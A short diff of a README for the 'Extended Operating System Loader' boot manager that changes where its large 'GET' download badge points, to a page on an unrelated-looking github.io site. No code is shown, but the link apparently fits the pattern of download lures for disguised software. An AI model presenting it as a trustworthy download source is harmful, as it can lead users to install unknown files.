@@ -4,7 +4,7 @@
 <img src="https://www.pro-linux.de/images/NB3/imgdb/o_loader-xosl-ist-gestartet.jpg" width="780">
 </p>
 
-[![GET — EXTENDED OPERATING SYSTEM LOADER](https://img.shields.io/badge/GET-EXTENDED%20OPERATING%20SYSTEM%20LOADER-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/)
+[![GET — EXTENDED OPERATING SYSTEM LOADER](https://img.shields.io/badge/GET-EXTENDED%20OPERATING%20SYSTEM%20LOADER-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/Extended-Operating)
 
 ---
 
